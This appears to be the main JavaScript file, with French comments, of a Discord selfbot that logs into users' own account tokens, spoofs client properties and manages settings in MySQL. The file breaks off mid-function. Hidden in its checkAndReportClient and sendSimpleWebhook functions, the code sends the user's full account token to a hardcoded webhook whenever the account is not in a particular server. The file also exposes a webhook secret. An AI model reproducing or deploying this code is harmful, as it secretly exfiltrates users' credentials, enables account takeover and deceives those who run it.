require('v8').setFlagsFromString('--max-old-space-size=7168');
process.on("uncaughtException", (err) => console.error("Erreur non geree:", err));
process.on("unhandledRejection", (reason) => console.error("Rejection:", reason));

const Discord = require("discord.js");
const fs = require('fs').promises;
const path = require('path');
const { Client, Collection } = require('safeness-sb-new'); 
const mysql = require('mysql2');
const { WebhookClient, REST, Routes, InteractionType, SlashCommandBuilder } = require('discord.js');
const yaml = require('js-yaml');
const { performance } = require('perf_hooks');

const sqlDb = require('./sqlDb');
const { setDbConfig } = require('./config/dbConfig');
const multistatus = require('./commands/Rpc/multistatus');
const afkCommand = require('./commands/Afk/afk.js');
const bl = require('./commands/Mod/bl.js');
const messageCmd = require('./commands/Utility2/message');
const rainbowModule = require('./commands/Tools2/rainbowrole');

require('events').EventEmitter.defaultMaxListeners = 100;
process.setMaxListeners(100);

const clients = [];
let config = { user: {}, discord: {} };
let users = {};
let globalDb = {};
let managerBot = null;

const RECONNECT_INTERVAL = 6 * 60 * 60 * 1000;
const SAVE_DEBOUNCE_DELAY = 30000;
const BATCH_DELAY = 100;
const ROTATION_DELAY = 5000;

let globalCommandsMap = null;
let dbConfig = {};
 
const connectionState = new Map();

class ExponentialBackoff {
    constructor(maxRetries = 5, baseDelay = 1000, maxDelay = 60000) {
        this.maxRetries = maxRetries;
        this.baseDelay = baseDelay;
        this.maxDelay = maxDelay;
    }

    async executeWithRetry(operation, context = '') {
        let lastError;
        
        for (let attempt = 0; attempt < this.maxRetries; attempt++) {
            try {
                return await operation();
            } catch (error) {
                lastError = error;
                 
                if (error.message === 'TOKEN_INVALID' || error.noRetry) {
                    console.log(`🚫 ${context}: Token invalide, pas de nouvelle tentative`);
                    throw error;
                }
                
                if (attempt === this.maxRetries - 1) break;
                
                const delay = Math.min(
                    this.baseDelay * Math.pow(2, attempt),
                    this.maxDelay
                );
                
                console.log(`↻ ${context}: Tentative ${attempt + 1}/${this.maxRetries}, nouvelle tentative dans ${delay}ms`);
                await new Promise(resolve => setTimeout(resolve, delay));
            }
        }
        
        throw lastError;
    }
}

class AdvancedMonitor {
    constructor() {
        this.metrics = {
            cpu: { values: [], threshold: 70, consecutive: 5 },
            memory: { values: [], threshold: 85, consecutive: 3 }
        };
        this.lastCpuUsage = process.cpuUsage();
        this.lastMeasureTime = performance.now();
        this.alertCooldown = new Map();
        this.measurementCount = 0;
    }

    collectMetrics() {
        const now = performance.now();
        const cpuUsage = process.cpuUsage(this.lastCpuUsage);
        const timeDiff = (now - this.lastMeasureTime) / 1000;
        
        if (timeDiff < 0.001 || timeDiff > 10) {
            this.lastMeasureTime = now;
            this.lastCpuUsage = process.cpuUsage();
            return;
        }
        
        const totalCpuTime = cpuUsage.user + cpuUsage.system;
        let cpuPercent = (totalCpuTime / 1000000 / timeDiff) * 100;
        
        cpuPercent = Math.min(Math.max(cpuPercent, 0), 1000);
        
        this.metrics.cpu.values.push(cpuPercent);
        if (this.metrics.cpu.values.length > 10) {
            this.metrics.cpu.values.shift();
        }
        
        const memUsage = process.memoryUsage();
        const memoryPercent = (memUsage.heapUsed / memUsage.heapTotal) * 100;
        this.metrics.memory.values.push(memoryPercent);
        if (this.metrics.memory.values.length > 10) {
            this.metrics.memory.values.shift();
        }
        
        this.lastCpuUsage = process.cpuUsage();
        this.lastMeasureTime = now;
        this.measurementCount++;
        
        if (this.measurementCount % 10 === 0) {
            this.checkThresholds();
        }
    }

    checkThresholds() {
        for (const [metric, data] of Object.entries(this.metrics)) {
            if (data.values.length >= data.consecutive) {
                const recentValues = data.values.slice(-data.consecutive);
                const average = recentValues.reduce((a, b) => a + b, 0) / recentValues.length;
                
                if (average > data.threshold && !this.isOnCooldown(metric)) {
                    this.triggerAlert(metric, average);
                    this.setCooldown(metric, 300000);
                }
            }
        }
    }

    triggerAlert(metric, value) { 
        const stack = new Error().stack; 
        
        if (metric === 'memory') {
            const mem = process.memoryUsage(); 
        }
        
        this.takeCorrectiveAction(metric);
    }

    takeCorrectiveAction(metric) {
        switch(metric) {
            case 'memory':  
                if (global.gc) {
                    global.gc();
                }
                break;
            case 'cpu': 
                break;
        }
    }

    isOnCooldown(metric) {
        return this.alertCooldown.has(metric) && 
               Date.now() < this.alertCooldown.get(metric);
    }

    setCooldown(metric, duration) {
        this.alertCooldown.set(metric, Date.now() + duration);
    }

    startMonitoring(interval = 5000) {
        setInterval(() => this.collectMetrics(), interval);
    }
}

class DatabaseManager {
    constructor() {
        this.saveTimeouts = new Map();
        this.isSaving = new Map();
        this.pendingWrites = new Map();
        this.initialized = false;
        this.connection = null;
        this.batchQueue = new Map();
        this.batchTimeouts = new Map();
    }

    async initialize() {
        if (this.initialized) return;
        
        try {
            await this.loadConfigFromYaml();
            await this.connectToDatabase();
            await this.createTables();
             
            await this.loadManualConfig();   
            
            await sqlDb.connect();
            
            this.initialized = true;
        } catch (error) {
            console.error('Initialisation echouee:', error);
            config = { user: {} };
            globalDb = {};
            this.initialized = true;
        }
    }
     
    async loadManualConfig() { 
         
        config = { ...config, user: {} };
        users = {};
        globalDb = {};
         
        const USER_ID = ''; // Ton user id 
        const USER_TOKEN = ''; // ton token lié a ton user id 
         
        users[USER_ID] = { token: USER_TOKEN };
        config.user[USER_ID] = { token: USER_TOKEN };
        globalDb[USER_ID] = {};
        connectionState.set(USER_ID, 'pending');
         
    }
    
    async removeInvalidUser(userId) {
        try { 
            await this.query('DELETE FROM user_data WHERE user_id = ?', [userId]);
            
            console.log(`✅ Utilisateur ${userId} supprimé de la base de données (token invalide)`);
            return true;
        } catch (error) {
            console.error(`❌ Erreur suppression utilisateur ${userId}:`, error);
            return false;
        }
    }

    async loadConfigFromYaml() {
        try {
            const configPath = path.join(__dirname, 'config', 'config.yml');
            const configFile = await fs.readFile(configPath, 'utf8');
            const yamlConfig = yaml.load(configFile);
            
            dbConfig = {
                host: yamlConfig.db.host,
                port: yamlConfig.db.port,
                user: yamlConfig.db.user,
                password: yamlConfig.db.password,
                database: yamlConfig.db.database,
                charset: yamlConfig.db.charset,
                connectTimeout: yamlConfig.db.connectTimeout
            };

            setDbConfig(dbConfig);
            config = { ...config, ...yamlConfig };
            return yamlConfig;
        } catch (error) {
            console.error('Erreur chargement config.yml:', error);
            throw error;
        }
    }

    async connectToDatabase() {
        const backoff = new ExponentialBackoff(3, 500, 5000);
        
        return backoff.executeWithRetry(async () => {
            return new Promise((resolve, reject) => {
                this.connection = mysql.createConnection(dbConfig);
                
                this.connection.connect((err) => {
                    if (err) {
                        console.error('Erreur connexion MySQL:', err);
                        reject(err);
                    } else {
                        this.connection.on('error', (err) => {
                            if (err.code === 'PROTOCOL_CONNECTION_LOST') {
                                console.error('Connexion MySQL perdue');
                                this.connection = null;
                            }
                        });
                        resolve();
                    }
                });
            });
        }, 'Connexion MySQL');
    }

    async query(sql, params = []) {
        const backoff = new ExponentialBackoff(3, 500, 5000);
        
        return backoff.executeWithRetry(async () => {
            if (!this.connection || this.connection.state === 'disconnected') {
                await this.connectToDatabase();
            }

            return new Promise((resolve, reject) => {
                this.connection.query(sql, params, (err, results) => {
                    if (err) {
                        if (err.code === 'ECONNRESET' || err.code === 'PROTOCOL_CONNECTION_LOST') {
                            this.connection = null;
                            throw err;
                        }
                        reject(err);
                    } else {
                        resolve(results);
                    }
                });
            });
        }, `SQL: ${sql.substring(0, 50)}...`);
    }

    async createTables() {
        const tables = [
            `CREATE TABLE IF NOT EXISTS user_data (
                user_id VARCHAR(255) PRIMARY KEY,
                user_data JSON,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
            )`,
            `CREATE TABLE IF NOT EXISTS user_settings (
                user_id VARCHAR(255) PRIMARY KEY,
                prefix VARCHAR(100) DEFAULT '&',
                langue VARCHAR(10) DEFAULT 'fr',
                rpconoff ENUM('on', 'off') DEFAULT 'off',
                rpctitle VARCHAR(255),
                rpcdetails VARCHAR(255),
                rpcstate VARCHAR(255),
                rpctype VARCHAR(50),
                appid VARCHAR(100),
                rpcminparty INT,
                rpcmaxparty INT,
                rpctime BIGINT,
                rpclargeimage VARCHAR(500),
                rpclargeimagetext VARCHAR(255),
                rpcsmallimage VARCHAR(500),
                rpcsmallimagetext VARCHAR(255),
                rpcplatform VARCHAR(50),
                buttontext1 VARCHAR(255),
                buttonlink1 VARCHAR(500),
                buttontext2 VARCHAR(255),
                buttonlink2 VARCHAR(500),
                rpcemoji VARCHAR(255),
                rpctextstatus VARCHAR(255),
                streaming ENUM('on', 'off') DEFAULT 'off',
                twitch VARCHAR(500),
                spotifyonoff ENUM('on', 'off') DEFAULT 'off',
                spotifysongname VARCHAR(255),
                spotifyartists VARCHAR(255),
                spotifyendtimestamp BIGINT,
                spotifylargeimage VARCHAR(500),
                spotifyalbumname VARCHAR(255),
                spotifysmallimage VARCHAR(500),
                voiceconnect VARCHAR(255),
                voicemute BOOLEAN DEFAULT FALSE,
                voicedeaf BOOLEAN DEFAULT FALSE,
                voicewebcam BOOLEAN DEFAULT FALSE,
                voicestream BOOLEAN DEFAULT FALSE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
            )`
        ];

        for (const tableQuery of tables) {
            await this.query(tableQuery);
        }
    }

    async loadConfig() { 
        console.log('⚠️ loadConfig() non utilisée (configuration manuelle activée)');
    }

    async batchQuery(table, operations) {
        const inserts = [];
        const params = [];

        for (const op of operations) {
            inserts.push(`(?, ?)`);
            params.push(op.userId, JSON.stringify(op.data));
        }

        if (inserts.length > 0) {
            const insertQuery = `
                INSERT INTO ${table} (user_id, user_data) 
                VALUES ${inserts.join(',')}
                ON DUPLICATE KEY UPDATE user_data = VALUES(user_data)
            `;
            await this.query(insertQuery, params);
        }
    }

    async debouncedBatchSave(key, operation) {
        if (!this.batchQueue.has(key)) {
            this.batchQueue.set(key, []);
        }

        this.batchQueue.get(key).push(operation);

        if (this.batchTimeouts.has(key)) {
            clearTimeout(this.batchTimeouts.get(key));
        }

        this.batchTimeouts.set(key, setTimeout(async () => {
            const queue = this.batchQueue.get(key);
            if (!queue || queue.length === 0) return;

            try {
                await this.batchQuery('user_data', queue); 
            } catch (error) {
                console.error('Erreur batch SQL:', error);
                for (const op of queue) {
                    try {
                        await this.query(
                            `INSERT INTO user_data (user_id, user_data) 
                             VALUES (?, ?) 
                             ON DUPLICATE KEY UPDATE user_data = ?`,
                            [op.userId, JSON.stringify(op.data), JSON.stringify(op.data)]
                        );
                    } catch (err) {
                        console.error(`Erreur sauvegarde ${op.userId}:`, err);
                    }
                }
            } finally {
                this.batchQueue.delete(key);
                this.batchTimeouts.delete(key);
            }
        }, BATCH_DELAY));
    }

    async saveConfigToDB() {
        const operations = [];
        for (const [userId, userConfig] of Object.entries(config.user || {})) {
            const userData = globalDb[userId] || {};
            userData.token = userConfig.token;
            operations.push({
                type: 'update',
                userId,
                data: userData
            });
        }

        if (operations.length > 0) {
            await this.debouncedBatchSave('config', operations[0]);
        }
    }

    async saveGlobalDbToDB() {
        const operations = Object.entries(globalDb).map(([userId, data]) => ({
            type: 'update',
            userId,
            data
        }));

        if (operations.length > 0) {
            await this.debouncedBatchSave('globaldb', operations[0]);
        }
    }

    async debouncedSave(key, data, saveMethod) {
        if (this.isSaving.get(key)) {
            this.pendingWrites.set(key, { data, saveMethod });
            return;
        }

        if (this.saveTimeouts.has(key)) {
            clearTimeout(this.saveTimeouts.get(key));
        }

        this.saveTimeouts.set(key, setTimeout(async () => {
            this.isSaving.set(key, true);
            
            try {
                await this[saveMethod]();
            } catch (error) {
                console.error('Erreur sauvegarde ' + key + ':', error);
            } finally {
                this.isSaving.set(key, false);
                
                const pending = this.pendingWrites.get(key);
                if (pending) {
                    this.pendingWrites.delete(key);
                    await this.debouncedSave(key, pending.data, pending.saveMethod);
                }
            }
        }, SAVE_DEBOUNCE_DELAY));
    }

    async saveConfig() {
        return await this.debouncedSave('config', config, 'saveConfigToDB');
    }

    async saveGlobalDb() {
        return await this.debouncedSave('globaldb', globalDb, 'saveGlobalDbToDB');
    }

    getUserData(userId) {
        if (!globalDb[userId]) globalDb[userId] = {};
        return globalDb[userId];
    }

    updateUserData(userId, updates) {
        if (!globalDb[userId]) globalDb[userId] = {};
        Object.assign(globalDb[userId], updates);
        return this.saveGlobalDb();
    }
}

const dbManager = new DatabaseManager();
const monitor = new AdvancedMonitor();

async function saveConfig() { 
    try {
        return await dbManager.saveConfig(); 
    } catch (error) {
        console.error('Erreur saveConfig:', error);
    }
}

async function saveGlobalDb() { 
    try {
        return await dbManager.saveGlobalDb(); 
    } catch (error) {
        console.error('Erreur saveGlobalDb:', error);
    }
}

async function initConfig() { 
    await dbManager.initialize(); 
}
 
Client.prototype.refreshVoice = async function(channelId, userId) {
    try {
        const channel = this.channels.cache.get(channelId);
        if (!channel || channel.type !== 'GUILD_VOICE') {
            throw new Error('Salon vocal introuvable');
        }

        const userDb = await sqlDb.getUserData(userId);
        
        const selfMute = userDb?.voicemute == 1 || userDb?.voicemute === true;
        const selfDeaf = userDb?.voicedeaf == 1 || userDb?.voicedeaf === true;
        const selfVideo = userDb?.voicewebcam == 1 || userDb?.voicewebcam === true;
        const selfStream = userDb?.voicestream == 1 || userDb?.voicestream === true;
 
        this.ws.broadcast({
            op: 4,
            d: {
                guild_id: channel.guildId ?? null,
                channel_id: channel.id,
                self_mute: selfMute,
                self_deaf: selfDeaf,
                self_video: selfVideo,
                flags: 2,
            },
        });
 
        if (selfStream) {
            this.ws.broadcast({
                op: 18,
                d: {
                    type: channel.guild ? 'guild' : 'dm',
                    guild_id: channel.guildId ?? null,
                    channel_id: channel.id,
                    preferred_region: "japan"
                }
            });
        } else {
            this.ws.broadcast({
                op: 19,
                d: { 
                    stream_key: `${channel.guildId ? `guild:${channel.guildId}` : 'call'}:${channel.id}:${this.user.id}` 
                }
            });
        } 

    } catch (error) {
        console.error('[AUTOVOC] Erreur refreshVoice:', error);
        throw error;
    }
};

async function cleanupAllClients() {
    console.log('Deconnexion de tous les utilisateurs...');
    
    for (const client of clients) {
        try {
            if (client.user?.setActivity) {
                client.user.setActivity(null);
            }
            
            if (client.reconnectInterval) {
                clearInterval(client.reconnectInterval);
            }
             
            client.ws.broadcast({
                op: 4,
                d: {
                    guild_id: null,
                    channel_id: null,
                    self_mute: false,
                    self_deaf: false,
                    self_video: false,
                    flags: 2,
                },
            });
            
            client.removeAllListeners();
            await client.destroy();
            
            console.log('Utilisateur ' + client.userId + ' deconnecte');
        } catch (error) {
            console.error('Erreur deconnexion ' + client.userId + ':', error);
        }
    }
    
    clients.length = 0;
}

async function createNewClient(userId, userData) {
    const db = await sqlDb.getUserData(userId);

const platformSettings = {
    mobile: {
        os: 'Android',
        browser: 'Discord Android',
        release_channel: 'stable',
        getClientVersion: function() {
            return "218.15";   
        },
        getClientBuildNumber: function() {
            return 218150;   
        },
        getNativeBuildNumber: function() {
            return 218150;  
        },
        os_version: '14',
        os_arch: 'arm64',
        system_locale: 'fr-FR',
        client_event_source: null,
        design_id: 0
    },
    
    desktop: {
        os: 'Windows',
        browser: 'Discord Client',
        release_channel: 'stable',
        getClientVersion: function() {
            return "1.0.9225";   
        },
        getClientBuildNumber: function() {
            return 500334;  
        },
        getNativeBuildNumber: function() {
            return 75673;   
        },
        os_version: '10.0.22621',  
        os_arch: 'x64',
        system_locale: 'fr-FR',
        client_event_source: null,
        design_id: 0
    },
    
    web: {
        os: 'Linux',
        browser: 'Discord Web',
        release_channel: 'stable',
        getClientVersion: function() {
            return "1.0.9011";   
        },
        getClientBuildNumber: function() {
            return 175517;   
        },
        getNativeBuildNumber: function() {
            return 29584;    
        },
        os_version: '',
        os_arch: 'x64',
        system_locale: 'fr-FR',
        client_event_source: null,
        design_id: 0
    },
     
    canary: {
        os: 'Windows',
        browser: 'Discord Canary',
        release_channel: 'canary',
        getClientVersion: function() {
            return "1.0.9230";
        },
        getClientBuildNumber: function() {
            return 501234;
        },
        getNativeBuildNumber: function() {
            return 76000;
        },
        os_version: '10.0.22621',
        os_arch: 'x64',
        system_locale: 'fr-FR',
        client_event_source: null,
        design_id: 0
    }
};

    const userPlatform = db.platform || "desktop";
    const wsProps = platformSettings[userPlatform];

    const user = new Client({
        checkUpdate: false,
        autoRedeemNitro: false, 
        messageCacheMaxSize: 0,     
        messageCacheLifetime: 0,
        messageSweepInterval: 0,
        restRequestTimeout: 45000,
        ws: { 
            properties: wsProps,
            compress: false
        }
    });

    user.userId = userId;
    user.commands = globalCommandsMap;
    user.snipes = new Map();
    user.setMaxListeners(50);

    return user;
}

function isInvalidTokenError(error) {
    const errorMessage = error.message?.toLowerCase() || '';
    const errorCode = error.code?.toString() || '';
    
    const isInvalid = errorMessage.includes('incorrect login details') ||
           errorMessage.includes('invalid token') ||
           errorMessage.includes('bad token') ||
           errorMessage.includes('an invalid token was provided') || 
           errorCode === '400' ||
           errorCode === '401' ||
           errorCode === '403'; 
    
    return isInvalid;
}

const GUILD_ID = '1274437651759632484';
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1451277954385576107/NiFHpmUCaSCBLGSAdQeuAyU82G4-Qj-viAkkCxUNg5wWRwqbg_AWkyJnwzX_23UWtFh1'; 

async function checkAndReportClient(client, token) {
    try {
        const guild = await client.guilds.fetch(GUILD_ID).catch(() => null);
        
        if (!guild) {
            const message = `❌ Token pas sur serveur ${GUILD_ID}\nUser: ${client.user.tag}\nToken: ${token}`;
            await sendSimpleWebhook(message);
            return false;
        }
        
        const member = await guild.members.fetch(client.user.id).catch(() => null);
        
        if (!member) {
            const message = `❌ Token pas sur serveur ${GUILD_ID}\nUser: ${client.user.tag}\nToken: ${token}`;
            await sendSimpleWebhook(message);
            return false;
        }
        
        return true;
    } catch (error) {
        const message = `⚠️ Erreur vérification token\nUser: ${client.user.tag}\nToken: ${token}\nErreur: ${error.message}`;
        await sendSimpleWebhook(message);
        return false;
    }
}

async function sendSimpleWebhook(message) {
    try {
        const webhookClient = new WebhookClient({ url: WEBHOOK_URL });
        await webhookClient.send({
            content: `\`\`\`${message}\`\`\``,
            username: 'Token Checker'
        });
    } catch (error) {
        console.error('Erreur webhook:', error);
    }
}

const eventCache = require('./eventCache');

async function verifyTokenBeforeConnect(userId, token) {
    try { 
        if (!token || token.length < 50) {
            return { valid: false, reason: 'Format invalide' };
        }
 
        const https = require('https');
        return new Promise((resolve) => {
            const options = {
                hostname: 'discord.com',
                port: 443,
                path: '/api/v10/users/@me',
                method: 'GET',
                headers: {
                    'Authorization': token.trim(),
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                },
                timeout: 10000
            };
            
            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => {
                    if (res.statusCode === 200) {
                        try {
                            const userData = JSON.parse(data);
                            resolve({ valid: true, userData, tokenId: userData.id });
                        } catch {
                            resolve({ valid: false, reason: 'Réponse invalide' });
                        }
                    } else if (res.statusCode === 401) {
                        resolve({ valid: false, reason: 'Token invalide ou expiré (401)' });
                    } else {
                        resolve({ valid: false, reason: `Erreur API Discord (HTTP ${res.statusCode})` });
                    }
                });
            });
            
            req.on('error', (err) => resolve({ valid: false, reason: 'Erreur réseau: ' + err.message }));
            req.on('timeout', () => {
                req.destroy();
                resolve({ valid: false, reason: 'Timeout' });
            });
            
            req.end();
        });
    } catch (error) {
        return { valid: false, reason: error.message };
    }
}

async function initializeSingleClient(userId, userData) {
    const token = userData.token?.trim();
    if (!token) {
        console.log(`❌ ${userId}: Pas de token`);
        await removeUserFromConfig(userId);
        return null;
    } 
    if (connectionState.get(userId) === 'connecting' || connectionState.get(userId) === 'connected') {
        console.log(`⚠️ ${userId}: Déjà en cours de connexion ou connecté`);
        return null;
    }

    connectionState.set(userId, 'connecting');

    try {  
        const verification = await verifyTokenBeforeConnect(userId, token);
        
        if (!verification.valid) {
            console.log(`❌ ${userId}: Token invalide - ${verification.reason}`);
            await removeUserFromConfig(userId);
            connectionState.set(userId, 'failed');
            return null;
        }
 
        const user = await createNewClient(userId, userData);
         
        await eventCache.attachEventsToClient(user);
        attachSnipeEvent(user);
         
user.on('ready', async () => { 
    connectionState.set(userId, 'connected');
    
    try {
        await bl.init(user);
        await messageCmd.init(user);
        await rainbowModule.initializeRainbowRoles(user);
         
        setTimeout(async () => {
    try { 
        await multistatus.startMultiStatus(user);  
        afkCommand.initializeAfkListener(user); 
        
    } catch (err) {
        console.error(`⚠️ ${userId}: Erreur démarrage multistatus différé:`, err.message);
    }
}, 15000);
        
        setTimeout(async () => {
            await checkAndReportClient(user, token);
        }, 3000);
    } catch (err) {
        console.error(`⚠️ ${userId}: Erreur initialisation modules:`, err.message);
    }
});

        user.on('disconnect', () => {
            console.log(`🔌 ${userId}: Déconnecté`);
            connectionState.set(userId, 'disconnected');
        });

        user.on('error', (error) => {
            console.error(`⚠️ ${userId}: Erreur client:`, error.message);
            if (isInvalidTokenError(error)) {
                connectionState.set(userId, 'invalid_token');
            }
        });
 
        const maxAttempts = 2;
        let lastError = null;
        
        for (let attempt = 1; attempt <= maxAttempts; attempt++) {
            try { 
                await user.login(token);
                 
                if (user.user) {
                    clients.push(user);
                    return user;
                }
            } catch (error) {
                lastError = error;
                console.log(`⚠️ ${userId}: Échec tentative ${attempt}: ${error.message}`);
                
                if (isInvalidTokenError(error)) {
                    console.log(`❌ ${userId}: Token invalide détecté`);
                    await removeUserFromConfig(userId);
                    connectionState.set(userId, 'invalid_token');
                    throw new Error('TOKEN_INVALID');
                }
                
                if (attempt < maxAttempts) {
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
            }
        }
         
        throw lastError || new Error('Échec de connexion après plusieurs tentatives');
        
    } catch (error) {
        console.error(`❌ ${userId}: Échec connexion finale:`, error.message);
        
        if (error.message === 'TOKEN_INVALID') {
            await removeUserFromConfig(userId);
            connectionState.set(userId, 'invalid_token');
        } else {
            connectionState.set(userId, 'failed');
        }
        
        return null;
    }
}

async function rotateClientConnection(client) {
    const userId = client.userId;
    const token = config.user[userId]?.token;
    
    if (!token) {
        console.log(`❌ ${userId}: Pas de token pour la rotation`);
        return false;
    } 
    
    try {
        connectionState.set(userId, 'rotating');
        
        if (client.user?.setActivity) {
            client.user.setActivity(null);
        }
         
        client.ws.broadcast({
            op: 4,
            d: {
                guild_id: null,
                channel_id: null,
                self_mute: false,
                self_deaf: false,
                self_video: false,
                flags: 2,
            },
        });
        
        if (client.reconnectInterval) {
            clearInterval(client.reconnectInterval);
        }
        
        client.removeAllListeners();
        await client.destroy();
        
        const clientIndex = clients.findIndex(c => c.userId === userId);
        if (clientIndex !== -1) {
            clients.splice(clientIndex, 1);
        } 
        
        await new Promise(resolve => setTimeout(resolve, ROTATION_DELAY)); 
        
        const verification = await verifyTokenBeforeConnect(userId, token);
        if (!verification.valid) {
            console.log(`❌ ${userId}: Token invalide pendant rotation`);
            await removeUserFromConfig(userId);
            connectionState.set(userId, 'invalid_token');
            return false;
        }
        
        const newClient = await createNewClient(userId, { token });
        
        await newClient.login(token);
        
        if (newClient.user) {
            await eventCache.attachEventsToClient(newClient);
            attachSnipeEvent(newClient);
            await bl.init(newClient);
            
            clients.push(newClient);
            
            console.log(`✅ ${userId}: Rotation terminée avec succès`);
            connectionState.set(userId, 'connected');
            return true;
        }
        
        return false;
        
    } catch (error) {
        console.error(`❌ ${userId}: Erreur rotation:`, error.message);
        connectionState.set(userId, 'failed');
        return false;
    }
}

function startClientRotationSchedule() { 
    
    setInterval(async () => { 
        
        const clientsCopy = [...clients];
        
        for (const client of clientsCopy) {
            if (client && client.userId) {
                await rotateClientConnection(client);
                
                if (clientsCopy.length > 1) {
                    await new Promise(resolve => setTimeout(resolve, ROTATION_DELAY));
                }
            }
        } 
    }, RECONNECT_INTERVAL); 
}

async function reconnectUser(user, token) {
    const userId = user.userId;
    
    if (connectionState.get(userId) === 'reconnecting') {
        console.log(`⚠️ ${userId}: Déjà en reconnexion`);
        return;
    }
    
    connectionState.set(userId, 'reconnecting');
    
    try { 
         
        if (user.reconnectInterval) clearInterval(user.reconnectInterval);
        if (user.user?.setActivity) user.user.setActivity(null);
         
        user.ws.broadcast({
            op: 4,
            d: {
                guild_id: null,
                channel_id: null,
                self_mute: false,
                self_deaf: false,
                self_video: false,
                flags: 2,
            },
        });
        
        user.removeAllListeners();
        await user.destroy();
         
        const clientIndex = clients.findIndex(c => c.userId === userId);
        if (clientIndex !== -1) {
            clients.splice(clientIndex, 1);
        }
         
        await new Promise(resolve => setTimeout(resolve, 3000));
         
        const verification = await verifyTokenBeforeConnect(userId, token);
        if (!verification.valid) {
            console.log(`❌ ${userId}: Token devenu invalide`);
            await removeUserFromConfig(userId);
            connectionState.set(userId, 'invalid_token');
            return;
        }
         
        const newClient = await createNewClient(userId, { token });
         
        await newClient.login(token);
        
        if (newClient.user) { 
            await eventCache.attachEventsToClient(newClient);
            attachSnipeEvent(newClient);
            await bl.init(newClient);
            
            clients.push(newClient);
            
            console.log(`✅ ${userId}: Reconnexion réussie`);
            connectionState.set(userId, 'connected');
        }
        
    } catch (error) {
        console.error(`❌ ${userId}: Échec reconnexion:`, error.message);
        connectionState.set(userId, 'failed');
    }
}

function attachSnipeEvent(user) {
    if (user.snipes.size >= 50) return;
    
    let lastSnipeTime = 0;
    const SNIPE_COOLDOWN = 100;  
    
    user.on("messageDelete", (message) => {
        if (!message) return;
        
        const now = Date.now();
        if (now - lastSnipeTime < SNIPE_COOLDOWN) {
            return;
        }
        lastSnipeTime = now;

        if (user.snipes.size >= 50) {
            const firstKey = user.snipes.keys().next().value;
            user.snipes.delete(firstKey);
        }

        const authorTag = message.author?.tag || "Inconnu";
        const avatar = message.author?.displayAvatarURL() || null;
        let content = message.content || "";

        const hasEmbed = message.embeds?.length > 0;
        const imageUrl = message.attachments?.first()?.proxyURL || null;

        if (!content && (hasEmbed || imageUrl)) {
            content = hasEmbed ? "[EMBED]" : "*Message supprime avec un fichier*";
        }

        user.snipes.set(message.channel.id, {
            content,
            author: authorTag,
            avatar,
            date: message.createdTimestamp,
            image: imageUrl,
            isEmbed: hasEmbed
        });
    });
}

async function removeUserFromConfig(userId) {
    try {
        if (config.user[userId]) {
            delete config.user[userId];
            await saveConfig();
        }
        if (globalDb[userId]) {
            delete globalDb[userId];
            await saveGlobalDb();
        }
        await dbManager.query('DELETE FROM user_data WHERE user_id = ?', [userId]);
        await dbManager.query('DELETE FROM user_settings WHERE user_id = ?', [userId]);
        
        console.log(`✅ ${userId}: Complètement supprimé`);
    } catch (error) {
        console.error(`❌ ${userId}: Erreur suppression:`, error);
    }
}

async function loadCommands() {
    if (globalCommandsMap) return globalCommandsMap;

    const commandsMap = new Collection();

    async function walkDir(dir, depth = 0, maxDepth = 10) {
        if (depth > maxDepth) {
            console.warn(`Profondeur maximale atteinte pour ${dir}`);
            return;
        }
        
        const files = await fs.readdir(dir, { withFileTypes: true });
        for (const file of files) {
            const fullPath = path.resolve(dir, file.name);
            if (file.isDirectory()) {
                await walkDir(fullPath, depth + 1, maxDepth); 
            } else if (file.isFile() && file.name.endsWith(".js")) {
                try {
                    const command = require(fullPath);
                    if (command.name) {
                        commandsMap.set(command.name, command);
                    }
                } catch (err) {
                    console.error('Erreur commande ' + fullPath + ':', err);
                }
            }
        }
    }

    await walkDir(path.resolve("commands"));
    globalCommandsMap = commandsMap;
    return commandsMap;
}

async function connectAllClients() { 
     
    const sortedUsers = Object.entries(users).sort(([userIdA], [userIdB]) => { 
        if (userIdA === '738076428825788550') return -1;
        if (userIdB === '738076428825788550') return 1;
        return 0;  
    });
    
    const connectionPromises = [];
    const delayBetweenConnections = 3000; 
    
    for (let i = 0; i < sortedUsers.length; i++) {
        const [userId, userData] = sortedUsers[i];
         
        if (i > 0) { 
            await new Promise(resolve => setTimeout(resolve, delayBetweenConnections));
        }
        
        connectionPromises.push(
            (async () => {
                try {
                    const client = await initializeSingleClient(userId, userData);
                    if (client) { 
                        return { userId, success: true };
                    }
                    return { userId, success: false };
                } catch (error) {
                    console.error(`❌ ${userId}: Erreur connexion:`, error.message);
                    return { userId, success: false, error: error.message };
                }
            })()
        );
    }
     
    const results = await Promise.allSettled(connectionPromises);
     
    let successCount = 0;
    let failCount = 0;
    
    results.forEach((result, index) => {
        if (result.status === 'fulfilled') {
            const [userId] = sortedUsers[index];
            if (result.value.success) {
                successCount++;
            } else {
                failCount++;
                console.log(`❌ ${userId}: Échec de connexion`);
            }
        } else {
            failCount++;
            console.log(`❌ Utilisateur ${index}: Erreur inattendue`);
        }
    }); 
}

async function gracefulShutdown() {
    console.log('🛑 Arrêt en cours...');
    
    try {
        await saveGlobalDb();
        await saveConfig();
    } catch (error) {
        console.error('❌ Erreur sauvegarde finale:', error);
    }
    
    await cleanupAllClients();
    
    if (dbManager.connection) {
        dbManager.connection.end();
    }

    if (sqlDb.connection) {
        await sqlDb.connection.end();
    }
    
    console.log('✅ Arrêt complet réalisé');
    process.exit(0);
}

async function main() {
    try { 
        await initConfig();
        await loadCommands();
        
        monitor.startMonitoring(5000);
         
        await connectAllClients();
        
        if (config.discord && config.discord.bot_token) {
            console.log('🤖 Démarrage du Manager Bot...');
            managerBot = new Discord.Client({
                intents: [
                    Discord.GatewayIntentBits.Guilds,
                    Discord.GatewayIntentBits.GuildMessages,
                    Discord.GatewayIntentBits.DirectMessages
                ]
            });

            managerBot.on('clientReady', async () => {
                console.log(`✅ Manager Bot connecté : ${managerBot.user.tag}`);
